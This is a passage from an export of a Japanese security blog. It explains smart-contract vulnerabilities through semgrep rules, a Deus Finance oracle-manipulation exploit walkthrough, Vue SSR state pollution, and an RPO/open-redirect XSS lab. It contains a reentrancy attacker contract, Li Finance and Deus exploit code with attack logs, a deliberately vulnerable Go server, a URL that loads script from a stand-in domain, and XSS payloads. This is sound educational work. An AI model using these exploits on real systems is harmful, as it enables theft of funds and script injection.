[{"categories":null,"contents":"semgrep-smart-contracts というリポジトリがあります。 これは、スマートコントラクトの脆弱性を発見するためのsemgrepルールをまとめたものです。\n今回は Access Control Vulnerabilities (CWE-284) に関連するルールを読んでみます。 この脆弱性は事例が非常に多いため分類を試みました。 この分類は独自のものであること、正しく全てを網羅していないことに注意が必要です。\nsemgrepルールの分類 スマートコントラクトにおけるアクセス制御の脆弱性において、semgrepルールを見る限りは関数の可視性に問題がある場合が多いようです。\n大別してみると、以下のようになりそうです。\n送金系の関数 管理者用の関数 オラクル更新用の関数 この分類は公式なものではないことに注意してください。\n送金系の関数 これは送金に利用される関数が外部からアクセスされてしまう脆弱性です。\nerc20-public-transfer.yaml public-transfer-fees-supporting-tax-tokens.yaml この脆弱性の悪用事例は以下の通り。190万ドルの損害が発生したそうです。\nknownsec Blockchain Lab | Creat future was tragically transferred coins at will, who is the mastermind behind the scenes! 管理者用の関数 これは管理者用に用意していた関数が外部からアクセスされてしまう脆弱性です。攻撃者にトークンをburnさせられたり、コントラクトのオーナーを切り替えた上でトークンを窃取することが可能になります。\nerc20-public-burn.yaml accessible-selfdestruct.yaml unrestricted-transferownership.yaml この脆弱性の悪用事例は以下の通り。\nDecoding Ragnarok Online Invasion $44,222 Exploit| QuillAudits オラクル更新用の関数 これは同じく、オラクル更新用の関数が外部からアクセスされてしまう脆弱性です。 スマートコントラクトの文脈においてのオラクルとは、ブロックチェーン外の情報をコントラクトに提供することを指します。攻撃者がこのオラクルを書き換えることで、基準としている値が信用できなくなり、トークンを不当に安く購入することが可能になります。\noracle-price-update-not-restricted.yaml sense-missing-oracle-access-control.yaml この脆弱性の発見の経緯は以下の通り。\nSense Finance Access Control Issue Bugfix Review ","date":"Mar 11","permalink":"https://mute1997.github.io/post/2024-04-11-access-control-vulnerabilities/","tags":["security"],"title":"semgrep-smart-contracts #05 (Access Control Vulnerabilities)"},{"categories":null,"contents":" これは 最近 cross-request state pollution という脆弱性を知りました。この脆弱性について理解を深めるため、コードを書いてこの脆弱性の理解を目指します。\ncross-request state pollution とは これはVue.jsのSSRにおいてサーバー側で作成したStateを他のリクエストにも利用してしまう脆弱性です。 この脆弱性によって、別のリクエストで使われたStateに含まれる情報が他のリクエストにも伝わってしまう可能性があります。\ncf. https://ja.vuejs.org/guide/scaling-up/ssr#cross-request-state-pollution\n実例 どのように発生するのか理解するために、実際にコードを書いてみました。\nhttps://github.com/mute1997/crsp-demo-for-advent-calendar このアプリケーションには大きく2つのページがあります。\n/ : カウンタ機能のあるページ /store : Stateを返すだけのページ このアプリケーションを使って、cross request state pollution が発生する状況を再現してみます。 以下はブラウザでの操作をコードで示したものです。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 user1 = requests.Session() user2 = requests.Session() # ユーザー1でインクリメント操作を1回行う ... user1.get(\u0026#34;{}{}\u0026#34;.format(target, \u0026#34;/store\u0026#34;)) # =\u0026gt; {\u0026#39;count\u0026#39;: 1} # ユーザー2でインクリメント操作を2回行う ... user2.get(\u0026#34;{}{}\u0026#34;.format(target, \u0026#34;/store\u0026#34;)) # =\u0026gt; {\u0026#39;count\u0026#39;: 2} # ユーザー1がアクセスした後、ユーザー2のセッションでユーザー1の結果が返却されている user1.get(target) res = user2.get(\u0026#34;{}{}\u0026#34;.format(target, \u0026#34;/store\u0026#34;)) # =\u0026gt; {\u0026#39;count\u0026#39;: 1} cross state request pollution が発生しているため、ユーザー2のレスポンスに意図しない結果が含まれていることが確認できます。\nこれは、以下のようなサーバー側のコードが原因で発生しています。\n1 2 // グローバルスコープに作成されているため、一度しか初期化されない。 export const store = createVuexState() 対策 対策としては以下の2つがありそうです。\nリクエスト毎にStateを再作成する SSRをやめる 1. リクエスト毎にStateを再作成する 以下のようにすることで、Stateがリクエスト毎に再作成されるため、問題は解決します。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 // store.js export function createVuexState() { return createState({ ... }); } // app.js export function createApp(initValue) { // このアプリケーションではcreateApp関数はリクエスト毎に呼ばれる // そのためStateはリクエスト毎に初期化される const store = createVuexState() const app = createSSRApp(...) app.use(store) return { app, store } } 2. SSRをやめる この解決策は単純です。 Stateの作成が各クライアントで行われるようになれば、この問題は発生しなくなります。\n検出 そもそもこの脆弱性にどうやって気づくことができるか、についても少し考えてみます。\nブラックボックス SSRを行うのであれば、Stateをサーバーからクライアントへ何らかの方法で渡す必要があります。 ドキュメントやフレームワークを見る限り、Vue.jsでは以下のようにしてStateの受け渡しをすることが多いようです。\n1 window.__INITIAL_STATE__ = ${state} このようなStateを発見できた場合、いろんなページにアクセスしながらStateを観察することで、この脆弱性を発見できる可能性はあります。\nただし、この方法ではサーバー側でStateが書き変わるタイミングによって再現したりしなかったり、確実に検知できるような方法ではなさそうです。 そのような事情もあって、ブラックボックス的な検知は難しそうに感じました。\nホワイトボックス Stateがリクエスト毎に再作成されているかをコードを読んで評価する、というのが一番簡単で確実な検出方法に思えました。\nまとめ この脆弱性の原理は非常に簡単に理解できるものでした。余談になりますが、この脆弱性を調べているときにJSON.stringifyを使ってStateをHTMLに埋め込むサンプルコードをいくつか見かけました。Stateにユーザーが入力した文字列がある場合、XSSができそうなので、こちらも気を付けて実装した方が良さそうです。\n","date":"Dec 19","permalink":"https://mute1997.github.io/post/2023-12-24-cross-request-state-pollution/","tags":["security"],"title":"cross-request state pollution とは"},{"categories":null,"contents":"semgrep-smart-contracts というリポジトリがあります。 これは、スマートコントラクトの脆弱性を発見するためのsemgrepルールをまとめたものです。\n今回は、basic-arithmetic-underflowというルールを読んでみます。\nbasic-arithmetic-underflow.yaml basic-arithmetic-underflow.sol 検出ルール 検出ルールは、以下の通りです。\nこのルールはまだBETAであり、まだsemgrepでは検出できません。\n1 2 3 4 5 6 7 8 pattern-sinks: - pattern: $Y - $X pattern-sources: - pattern-either: - pattern-inside: | function $F(..., $X, ...) external { ... } - pattern-inside: | function $F(..., $X, ...) public { ... } underflowとは solidityの特定のバージョンでは、型の下限値を超えてデクリメントをしてしまった場合、意図しない動作を誘発する恐れがあります。\n例として、solidityでuint8の変数を使うことを考えます。\nこのuint8の変数が0のとき、デクリメントすると255になってしまいます。\n1 2 uint8 balance = 0; balance--; // balance == 255 この挙動は、solidity \u0026gt;= 0.8 からデフォルトでチェックされるように修正されたそうです。\nこのチェックを除外してコンパイルするためには、以下のようにuncheckedという構文を利用できるようです。\n1 2 3 unchecked { balance--; } RemittanceTokenでの事例 この脆弱性が存在した、RemittanceTokenというコントラクトについて解説します。\nRemittanceTokenは、ERC20のトークンで、このトークンのburn関数にバグがあります。\nburn関数のソースコードは以下の通りです。\n1 2 3 4 5 6 7 8 //Burn tokens from owner account function burn(uint256 _count) public returns (bool success) { balanceOf[msg.sender] -=uint112( _count); deleteToken = _count.add(deleteToken).toUINT112(); _totalSupply = _totalSupply.sub(_count).toUINT112(); Burn(msg.sender, _count); return true; } 2行目の計算にバグがあります。\n1 balanceOf[msg.sender] -=uint112( _count); このトークンを持っていない場合、0-_countの計算が発生するため、underflowが発生します。\nその結果、攻撃者はこのトークンを無限に手に入れることが出来ます。\n","date":"Jun 07","permalink":"https://mute1997.github.io/post/2022-06-07-semgrep-smart-contracts-4/","tags":["security"],"title":"semgrep-smart-contracts #04 (basic-arithmetic-underflow)"},{"categories":null,"contents":"semgrep-smart-contracts というリポジトリがあります。 これは、スマートコントラクトの脆弱性を発見するためのsemgrepルールをまとめたものです。\n今回は、basic-reentrancyというルールを読んでみます。\nbasic-reentrancy.yaml basic-reentrancy.sol 検出ルール 検出ルールは、以下の通りです。\nこのルールはまだBETAであり、まだsemgrepでは検出できません。\n1 2 3 4 5 6 7 8 9 patterns: - pattern-either: - pattern-inside: | function $F(..., $X, ...) external { ... } - pattern-inside: | function $F(..., $X, ...) public { ... } - pattern-not-inside: | function $F(..., $X, ...) onlyOwner { ... } - pattern: $X.$M(...) Reentrancy attackとは reentrant (再入可能性) とは、ある関数の実行中に、同じ関数を実行しても安全であるという性質のことを指します。\nスマートコントラクトにおいては、攻撃対象から、任意のコントラクトを呼び出し可能な場合にReentrancy attackが発生する恐れがあります。\nこの攻撃は、以下の論文で詳細に解説されています。\nReentrancy Vulnerability Identification in Ethereum Smart Contracts\n論文では、\nSingle Function Reentrancy attack Cross Function Reentrancy attack という２つの攻撃に分類されています。\nfallback / receive関数 この攻撃を理解する前に、前提条件としてfallback / receive関数について知る必要があります。\nreceive関数は、スマートコントラクトが送金を受け取った時に呼び出される関数です。 receive関数が定義されていないなどで呼び出せなかった場合には、fallback関数が呼び出されます。\nそれぞれ、以下のような特殊な関数として記述されます。\n1 2 3 4 5 6 7 contract Sample { receive() external payable { } fallback() external payable { } } Single Function Reentrancy attack Single Function Reentrancy attackは、単一の関数で発生するReentrancy attackです。\n具体例として、以下のようなスマートコントラクトを考えます。 これは、預け入れたものをwithdraw関数で引き出すことが可能なスマートコントラクトになります。\n1 2 3 4 5 6 7 8 9 10 11 12 // 被害者コード contract ContractA { ... // 引き出し function withdraw() external { receiver.transfer(amount); balances[receiver] -= amount; } ... } 攻撃のためのエクスプロイトコードは以下の通りです。\nreceiveという関数があり、その関数内では他コントラクトが呼び出されています。\n1 2 3 4 5 6 // 攻撃者コード contract ContractB { receive() external payable { contractA.withdraw(); } } エクスプロイトの流れを以下に記しました。\n1 ) 攻撃者がcontractBを呼び出し 2 ) contractBがwithdraw関数を呼び出し 3 ) contractAに制御が移り、送金が行われる 4 ) 送金により、contractBのreceive関数が呼び出される 5 ) receive関数内で、再度withdraw関数の呼び出し 6 ) 繰り返し ... ... ... 上記に記載した流れが続くことで、攻撃者は無限に引き出しを行うことが出来ます。\nこれは、状態を更新する前に送金を行ってしまっているために起こっています。\n以下のように修正することで、攻撃を防ぐことが可能になります。\n1 2 3 4 5 6 7 8 9 10 11 contract ContractA { ... // 引き出し function withdraw() external { balances[receiver] -= amount; receiver.transfer(amount); } ... } Cross Function Reentrancy attack Cross Function Reentrancy attackも基本は同じで、状態を共有する2つの関数がある場合に起こります。\n具体例として、以下のようなスマートコントラクトがあることを考えます。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 mapping (address =\u0026gt; uint) private balance; function transfer(address to, uint amount) { if (balance[msg.sender] \u0026gt;= amount){ balance[to] += amount; balance[msg.sender] -= amount; } } function withdraw() public { uint amount = balance[msg.sender]; require(msg.sender.call.value(amount)()); /* At this point, the caller’s code is executed, and can call transfer() */ balance[msg.sender] = 0; } 攻撃者がwithdrawを呼び出した段階で残高が更新されていないため、receive関数がtransferを呼び出すことで資金の抜き取りが可能となります。\n","date":"May 12","permalink":"https://mute1997.github.io/post/2022-05-12-semgrep-smart-contracts-3/","tags":["security"],"title":"semgrep-smart-contracts #03 (basic-reentrancy)"},{"categories":null,"contents":"semgrep-smart-contracts というリポジトリがあります。 これは、スマートコントラクトの脆弱性を発見するためのsemgrepルールをまとめたものです。\n今回は、arbitrary-low-level-callというルールを読んでみます。\narbitrary-low-level-call.yaml arbitrary-low-level-call.sol 検出ルール 検出ルールは、以下の通りです。\nこのルールは、betaであり、semgrepではまだ検出は出来ないようです。\n1 2 3 4 5 6 7 patterns: - pattern-either: - pattern-inside: | function $F(..., $ADDR, ...) external { ... } - pattern-inside: | function $F(..., $ADDR, ...) public { ... } - pattern: $ADDR.call($DATA); この脆弱性は、引数で渡されたアドレスに対し、call関数が呼ばれた場合に検知するものです。\ncall関数は、アドレス型の関数で、別スマートコントラクトの関数を呼び出すためのものです。 詳細は以下のドキュメントを参照してください。 https://docs.soliditylang.org/en/develop/types.html#members-of-addresses\nこの脆弱性は、特定のスマートコントラクトやユーザーに対してのみ許可している操作を、攻撃者が任意で呼び出せてしまうことに問題があります。\n攻撃者は、transferFromなどの送金用関数を自分のアドレスに対して利用することで、資金を盗むことが可能になります。\nLi Financeでの事例 この脆弱性を悪用した攻撃が、Li Financeで発生しました。 攻撃トランザクションとエクスプロイトコードは以下の通りです。\nTransaction Exploit 問題が起こったのは、swapAndStartBridgeTokensViaCBridge関数です。\nこの関数は、_swapDataという関数を受け取り、callDataを引数としてcallToに対して関数が呼び出されています。\n1 2 3 4 5 6 7 8 9 10 11 function swapAndStartBridgeTokensViaCBridge( LiFiData memory _lifiData, LibSwap.SwapData[] calldata _swapData, CBridgeData memory _cBridgeData ) public payable { ... LibSwap.swap(_lifiData.transactionId, _swapData[i]); ... } 1 2 3 4 5 6 7 function swap(bytes32 transactionId, SwapData calldata _swapData) internal { ... (bool success, bytes memory res) = _swapData.callTo.call{ value: msg.value }(_swapData.callData); ... } 攻撃者は、\ncallToをスマートコントラクトの呼び出しが許可されているアドレスに設定 callDataにtransferFrom関数を利用する ことで、自身のアドレスへの送金を行うことが可能でした。\n1 2 3 4 5 6 7 _swapData[1].callTo = address(MATIC); _swapData[1].callData = abi.encodeWithSignature( \u0026#34;transferFrom(address,address,uint256)\u0026#34;, 0x445C21166a3Cb20b14FA84Cfc5D122F6bd3fFa17, address(this), transferAmount(MATIC, 0x445C21166a3Cb20b14FA84Cfc5D122F6bd3fFa17) ); ","date":"May 04","permalink":"https://mute1997.github.io/post/2022-05-04-semgrep-smart-contracts-2/","tags":["security"],"title":"semgrep-smart-contracts #02 (arbitrary-low-level-call)"},{"categories":null,"contents":"semgrep-smart-contracts というリポジトリがあります。 これは、スマートコントラクトの脆弱性を発見するためのsemgrepルールをまとめたものです。\nこのリポジトリの、検出ルールと脆弱なコードを読んでいくことで、スマートコントラクトの脆弱性を学びます。今回は、以下のルールを読んでいきます。\nbasic-oracle-manipulation.yaml basic-oracle-manipulation.sol 検出ルール まず、semgrepのルールを理解するために、ルールを日本語として表現します。\n関数内の処理であること 関数の名称が (?i)get([a-z0-9_])*price にマッチすること $X.div($Y)、もしくは$X / $Yであること $Xは以下の文字列のどれかを含むこと underlying underlyingUnit pair reserve reserve0 reserve1 $Yは.*totalSupply.*にマッチすること このルールを実行すると、以下の2つがsemgrepによって検出されます。\n1 2 3 101┆ _sharePrice = totalSupply() == 0 102┆ ? underlyingUnit 103┆ : underlyingUnit.mul(balanceWithInvested()).div(totalSupply()); 1 2 355┆ ((dei.balanceOf(address(pair)) + (usdc.balanceOf(address(pair)) * 1e12)) * 356┆ 1e18) / pair.totalSupply(); ルールと、何が検出されるのかは分かったものの、これだけでは何が脆弱なのか分からないので、エクスプロイトを調べてみます。\nエクスプロイト このスマートコントラクトに刺さるエクスプロイトを調べてみます。 Deus Financeというプロジェクトで、この手法を用いたハッキング被害が起こったようです。\nDeus Financeなど複数のDeFiプロトコルで16億円超のハッキング被害 The Deus Hack Explained Deus Finance oracle attack event analysis DEUS post mortem GitHubにエクスプロイトがあったので、これを読んで見ることにします。\nhttps://github.com/PwnedNoMore/postmortem/blob/main/2022/deus/contracts/Exploit.sol\n注意として、このエクスプロイトは2022年の3/15に発生したエクスプロイトになります。\nDeus Financeでは、2022年の4/28にもオラクルを操作した問題が再発生しています。\nまずはローカルのネットワークでこのエクスプロイトを実行をしてみます。 もともと hardhat.config.js に指定されているURLではダメなようなので、https://rpc.fantom.network/に変更して動作させます。\n1 2 3 4 forking: { url: \u0026#34;https://rpc.fantom.network/\u0026#34;, blockNumber: 33466613 } npx hardhat run scripts/main.js コマンドを実行すると、以下のような出力が得られます。\n[+] (0) before attack [+] my USDC balance: 0 [+] my DEI balance: 0 [+] spirit USDC reserve: 9713881664165 [+] spirit DEI reserve: 9739342685820948870544271 [+] the amount of DEI to borrow (spirit): 9739342685820948870544270 [+] the amount of DEI to pay back (spirit): 9768648631716097162030362 [+] (1) flash swap from spirit pool [+] my USDC balance: 0 [+] my DEI balance: 9739342685820948870544270 [+] sAMM USDC reserve: 24660757275320 [+] sAMM DEI reserve: 24772798349205085390700207 [+] the amount of DEI to borrow (sAMM): 24772798349205085390700206 [+] the amount of DEI to pay back (sAMM): 24775275876792764667166923 [+] sAMM LP price: 2000000005487107362736617 [+] (2) flash swap from sAMM pool [+] my USDC balance: 0 [+] my DEI balance: 34512141035026034261244476 [+] my LP deposit token balance: 0 [+] my LP token balance: 0 [+] sAMM LP price: 997733504354413127115105 [+] (3) liquidate the assets of victims [+] my USDC balance: 0 [+] my DEI balance: 27150599219672207566872765 [+] my LP deposit token balance: 5230026958164438186 [+] my LP token balance: 0 [+] (4) exit the flash swap from sAMM pool [+] my USDC balance: 0 [+] my DEI balance: 2375323342879442899705842 [+] my LP deposit token balance: 5230026958164438186 [+] my LP token balance: 0 [+] (5) deposit LP deposit tokens to earn LP tokens [+] my LP deposit token balance: 0 [+] my LP token balance: 5230026958164438186 [+] (6) remove liquidity [+] my USDC balance: 5218173124837 [+] my DEI balance: 7617204163068582172512381 [+] my LP token balance: 0 [+] (7) swap USDC to DEI from sAMM pool [+] my USDC balance: 0 [+] my DEI balance: 12787419360961504871925327 [+] (8) exit the flash swap from spirit pool [+] my USDC balance: 0 [+] my DEI balance: 3018770729245407709894965 [+] (9) swap DEI to USDC from sAMM pool [+] my USDC balance: 3064570164495 [+] my DEI balance: 0 全部で9つのステップあるので、1ステップずつ読んでいきます。\n1 ) フラッシュスワップでDEIの借り入れ エクスプロイトではまず、 0x8eFD36aA4Afa9F4E157bec759F1744A7FeBaEA0e から、フラッシュスワップを利用してDEIを借り入れます。\nフラッシュスワップについてはこちらを参照してください。\nhttps://docs.uniswap.org/protocol/V2/guides/smart-contract-integration/using-flash-swaps\n1 spiritUsdcDei.swap(0, _reserve1 - 1, me, abi.encode(uint8(0x1))); この借り入れは、オラクルを操作した後、ユーザーの負債を返却する際に利用されます。\nswapのコールバック関数の中で、my DEI balanceが大きく増えていることが確認できます。\n[+] (1) flash swap from spirit pool [+] my USDC balance: 0 [+] my DEI balance: 9739342685820948870544270 [+] sAMM USDC reserve: 24660757275320 [+] sAMM DEI reserve: 24772798349205085390700207 [+] the amount of DEI to borrow (sAMM): 24772798349205085390700206 [+] the amount of DEI to pay back (sAMM): 24775275876792764667166923 [+] sAMM LP price: 2000000005487107362736617 2 ) オラクル計算元からDEIの借り入れ 次に、0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0 から、DEIを借り入れます。\nこれは、上記アドレスのDEI, USDCの残高がオラクルとして用いられているため、それを操作する目的で借り入れるものです。\nこのようにして大量に借り入れることで価値が下がり、ユーザーの清算処理を行うことができます。\n1 sAMMUsdcDei.swap(0, _reserve1 - 1, me, abi.encode(uint8(0x2))); 借り入れ後、さらにmy DEI balanceが上昇していることが分かります。\n[+] (2) flash swap from sAMM pool [+] my USDC balance: 0 [+] my DEI balance: 34512141035026034261244476 [+] my LP deposit token balance: 0 [+] my LP token balance: 0 [+] sAMM LP price: 997733504354413127115105 3 ) 特定ユーザーの清算処理 以下のコードが呼び出され、特定のユーザーに対して清算処理が行われます。\n1 2 dei.approve(deiLenderSolidex.mintHelper(), dei.balanceOf(me)); deiLenderSolidex.liquidate(victims, me); 清算処理が実行されると、以下のコードが呼び出されます。\n1 2 3 4 5 6 7 8 9 10 11 function isSolvent(address user) public view returns (bool) { // accrue must have already been called! uint256 userCollateralAmount = userCollateral[user]; if (userCollateralAmount == 0) return getDebt(user) == 0; return userCollateralAmount.mul(oracle.getPrice()).mul(LIQUIDATION_RATIO) / (uint256(1e18).mul(1e18)) \u0026gt; getDebt(user); } このとき、清算処理が実際に行われるかどうかを判断するために、getPrice関数が呼び出されます。 この関数は、プールしてあるDEIとUSDCの量から、DEIの価格を返却する関数です。\nステップ2でフラッシュスワップしているため、DEIの残高が低下しています。 そのため、担保割れしていると判断され、清算処理が行われます。\n1 2 3 4 5 function getPrice() external view returns (uint256) { return ((dei.balanceOf(address(pair)) + (usdc.balanceOf(address(pair)) * 1e12)) * 1e18) / pair.totalSupply(); } [+] (3) liquidate the assets of victims [+] my USDC balance: 0 [+] my DEI balance: 27150599219672207566872765 [+] my LP deposit token balance: 5230026958164438186 [+] my LP token balance: 0 4 ) ステップ2でフラッシュスワップしたものを返却 攻撃の肝となる部分はほとんど終わったため、ここから先はフラッシュスワップの返却やLPトークンの売却などが行われます。\nこのステップでは、ステップ2で借り入れていたDEIの返却を行っています。\nログから、my DEI balanceが低下していることが分かります。\n[+] (4) exit the flash swap from sAMM pool [+] my USDC balance: 0 [+] my DEI balance: 2375323342879442899705842 [+] my LP deposit token balance: 5230026958164438186 [+] my LP token balance: 0 5 ) LPトークンの引き出し depositされているLPトークンを引き出します。\n[+] (5) deposit LP deposit tokens to earn LP tokens [+] my LP deposit token balance: 0 [+] my LP token balance: 5230026958164438186 6 ) LPトークンのburn 清算したことで得られたLPトークンをburnし、USDCとDEIを得ます。\nhttps://docs.uniswap.org/protocol/V2/concepts/protocol-overview/how-uniswap-works\n1 2 3 4 5 // prepare the LP burning ERC20(address(sAMMUsdcDei)).transfer(address(sAMMUsdcDei), sAMMUsdcDei.balanceOf(me)); // burn the LP sAMMUsdcDei.burn(me); my LP token balanceが0になり、my USDC balance / my DEI balanceが増加していることが分かります。\n[+] (6) remove liquidity [+] my USDC balance: 5218173124837 [+] my DEI balance: 7617204163068582172512381 [+] my LP token balance: 0 7 ) USDCをDEIへスワップ フラッシュローンの返却のため、USDCをDEIへスワップします。\nログにより、my USDC balanceが0に、my DEI balanceが増えていることが確認できます。\n[+] (7) swap USDC to DEI from sAMM pool [+] my USDC balance: 0 [+] my DEI balance: 12787419360961504871925327 8 ) ステップ1でフラッシュスワップしたものを返却 これで、借りたDEI以上の資金を用意できたため、フラッシュスワップが正常に終了します。\n[+] (8) exit the flash swap from spirit pool [+] my USDC balance: 0 [+] my DEI balance: 3018770729245407709894965 9 ) DEIをUSDCへスワップ 最終的に、3064570164495ドルが得られます。\n[+] (9) swap DEI to USDC from sAMM pool [+] my USDC balance: 3064570164495 [+] my DEI balance: 0 修正 今回の問題は、DEIの現在価格が、USDC / DEIのプールの現在の残高から導き出されてしまうことに問題がありました。\nそのような実装になっていたため、フラッシュスワップでの大規模な借り入れが発生すると、DEIの現在価格が低く計算されてしまっていました。\nそのためDeus Financeでは、Time-Weighted Average Price (TWAP)という時間加重平均を用いた価格算出ロジックに変更することで修正されました。\nOracle.sol#L85-L91\nOracles | Uniswap\n","date":"Apr 20","permalink":"https://mute1997.github.io/post/2022-04-20-semgrep-smart-contracts-1/","tags":["security"],"title":"semgrep-smart-contracts #01 (basic-oracle-manipulation)"},{"categories":null,"contents":"RPOとは、Gareth Heyesが提唱した脆弱性です。(http://www.thespanner.co.uk/2014/03/21/rpo/)\nこの脆弱性の理解のため、今回はintigritiのXSS Challengeで出題された問題の再現を行います。 この問題の詳細は以下の動画で確認できます。\n上記の動画では、http://vulnerable-server//example.com/..にアクセスを行い、相対パスで読み込んでいるリソースの起点をhttp://vulnerable-server//example.comとすることで、任意のスクリプトの実行を行なっています。\nhttp://vulnerable-server//example.com/..へのアクセスは、サーバーの仕様によりhttp://vulnerable-server/にアクセスした時と同じコンテンツが返却されます。\nhttp://vulnerable-server/では、以下の様に相対パスでのスクリプトの読み込みを行なっているため、http://vulnerable-server//example.com/script.jsからスクリプトが読み込まれます。\n1 \u0026lt;script src=script.js\u0026gt; \u0026lt;/script\u0026gt; \u0026lt;!-- http://vulnerable-server//example.com/script.js--\u0026gt; http://vulnerable-server//example.com/script.jsへのアクセスは、リダイレクトの機能が動作するため、実際にはhttp://example.com/script.jsから読み込まれます。\n攻撃者はexample.comの部分を好きなドメインに書き換えてアクセスすることで、好きなドメインからスクリプトを読み込むことが可能になります。\n実装してみる 今回実装する脆弱なWebサーバーは、以下の機能を有しています。\n//\u0026lt;ホスト名\u0026gt;というようなアクセスでリダイレクトが可能 ex. http://vulnerable-server//example.com 正規化されたパスのコンテンツが返却される ex. http://example.com/first/.. =\u0026gt; http://example.com/ 相対パスでスクリプトの読み込みが行われている ex. \u0026lt;script src=script.js\u0026gt;\u0026lt;/script\u0026gt; Webサーバーの実装は以下の通りです。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 package main import ( \u0026#34;net/http\u0026#34; \u0026#34;log\u0026#34; \u0026#34;path\u0026#34; \u0026#34;fmt\u0026#34; ) type VulnerableHandler map[string]http.Handler func (v VulnerableHandler) ServeHTTP(w http.ResponseWriter,r *http.Request){ // Serve HTTP p := path.Clean(r.URL.Path) if h, ok := v[p]; ok { log.Printf(\u0026#34;serve: %s\\n\u0026#34;, p) h.ServeHTTP(w, r) return } // OpenRedirect if len(r.URL.Path) \u0026gt; 1 \u0026amp;\u0026amp; r.URL.Path[0] == \u0026#39;/\u0026#39; \u0026amp;\u0026amp; r.URL.Path[1] == \u0026#39;/\u0026#39; { redirectTo := fmt.Sprintf(\u0026#34;https://%s\u0026#34;, r.URL.Path[2:]) w.Header().Set(\u0026#34;Location\u0026#34;, redirectTo) w.WriteHeader(302) log.Printf(\u0026#34;redirect: %s\\n\u0026#34;, redirectTo) return } // return 404 http.Error(w, \u0026#34;404\u0026#34;, http.StatusNotFound) } func index(w http.ResponseWriter, r *http.Request) { w.Write([]byte(` \u0026lt;p\u0026gt;index page\u0026lt;/p\u0026gt; \u0026lt;script src=\u0026#34;script.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; `)) } func main() { mux := http.NewServeMux() mux.Handle(\u0026#34;/\u0026#34;, VulnerableHandler{ \u0026#34;/\u0026#34;: http.HandlerFunc(index), }) handler := VulnerableHandler{ \u0026#34;/\u0026#34;: http.HandlerFunc(index), } http.ListenAndServe(\u0026#34;:8000\u0026#34;, handler) } GitHubのリンクはこちらです。(https://github.com/mute1997/relative-path-overwrite)\n再現 実装したサーバーを用いて、XSSを再現させます。\nまずChromeでhttp://localhost:8000//example.com/..にアクセスしますが、ここで問題があります。\n以下のスクリーンショットの様に、Chromeではhttp://localhost:8000//example.com/..にアクセスした場合、ブラウザによってhttp://localhost:8000へのアクセスへ勝手に変更されてしまいます。\nこの挙動は、FireFoxはSafariでも同様です。 これでは、相対パスの起点をhttp://localhost:8000//example.comにすることが出来ません。\nしかし、FireFoxではhttp://localhost:8000//example.com/%2e%2eと言う様なアクセスを行うことで、ブラウザの正規化を回避してアクセスが可能になります。\nFireFoxでhttp://localhost:8000//example.com/%2e%2eにアクセスすることで、以下の様にhttp://example.com/script.jsからファイルを読み込んでおり、攻撃が成功したことがわかります。\nまとめ 今回の例では、非常に限定的ではありますが、RPOとOpenRedirectを用いてXSSが可能であることを確認できました。 相対パスの読み込みを絶対パスに修正するだけで回避可能な脆弱性なため、リソースの読み込みは必要が無ければ絶対URLで行うのが良さそうです。\n","date":"Jul 20","permalink":"https://mute1997.github.io/post/2021-07-21-rpo/","tags":["security"],"title":"RPOとOpenRedirectを用いたXSS"},{"categories":null,"contents":"","date":"Nov 26","permalink":"https://mute1997.github.io/articles/","tags":null,"title":"Articles"},{"categories":null,"contents":"以下の記事を読んでいて気になったことがあるので調べてみた。\nhttps://portswigger.net/web-security/cross-site-scripting/preventing#encode-data-on-output\n気になったのは以下の部分。\n1 2 3 Sometimes you\u0026#39;ll need to apply multiple layers of encoding, in the correct order. For example, to safely embed user input inside an event handler, you need to deal with both the JavaScript context and the HTML context. So you need to first Unicode-escape the input, and then HTML-encode it: \u0026lt;a href=\u0026#34;#\u0026#34; onclick=\u0026#34;x=\u0026#39;This string needs two layers of escaping\u0026#39;\u0026#34;\u0026gt;test\u0026lt;/a\u0026gt; イベントハンドラにJavaScriptを書いている所にユーザーの入力を埋め込む場合は、unicodeエスケープをしてからHTMLエンコードする必要があると書いてある。\n個人的にはunicodeエスケープだけではダメなのか気になったので実験してみた。\nアラートを実行するために';alert(1);'を入力したことを考える。\n以下がunicodeエスケープのみを行って埋め込んだ場合。\n1 \u0026lt;a href=\u0026#34;#\u0026#34; onclick=\u0026#34;x=\u0026#39;\u0026amp;#x0027;\u0026amp;#x003b;alert\u0026amp;#x0028;1\u0026amp;#x0029;\u0026amp;#x003b;\u0026amp;#x0027;\u0026#39;;\u0026#34;\u0026gt;link\u0026lt;/a\u0026gt; 以下はunicodeエスケープした後にHTMLエンコードを行ったもの。\n1 \u0026lt;a href=\u0026#34;#\u0026#34; onclick=\u0026#34;x=\u0026#39;\u0026amp;#38;\u0026amp;#35;x0027\u0026amp;#59;\u0026amp;#38;\u0026amp;#35;x003b\u0026amp;#59;alert\u0026amp;#38;\u0026amp;#35;x0028\u0026amp;#59;1\u0026amp;#38;\u0026amp;#35;x0029\u0026amp;#59;\u0026amp;#38;\u0026amp;#35;x003b\u0026amp;#59;\u0026amp;#38;\u0026amp;#35;x0027\u0026amp;#59;\u0026#39;;\u0026#34;\u0026gt;link\u0026lt;/a\u0026gt; unicodeエスケープとHTMLエンコードには以下の関数を用いた。\n1 2 3 4 5 function htmlEncode(str){ return String(str).replace(/[^\\w. ]/gi, function(c){ return \u0026#39;\u0026amp;#\u0026#39;+c.charCodeAt(0)+\u0026#39;;\u0026#39;; }); } 1 2 3 4 5 function jsEscape(str){ return String(str).replace(/[^\\w. ]/gi, function(c){ return \u0026#39;\u0026amp;#x\u0026#39;+(\u0026#39;0000\u0026#39;+c.charCodeAt(0).toString(16)).slice(-4)+\u0026#39;;\u0026#39;; }); } これらをブラウザで開いてからクリックすると、前者はアラートが実行され、後者は何も起こらない。\nこれはイベントハンドラでのみ起こるのか調べるために、unicodeエスケープのみを行った\u0026lt;img src=x onerror=alert(1)\u0026gt;をページに書き込んで開いてみる。\n1 \u0026amp;#x003c;img src\u0026amp;#x003d;x onerror\u0026amp;#x003d;alert\u0026amp;#x0028;1\u0026amp;#x0029;\u0026amp;#x003e; \u0026lt;img src=x 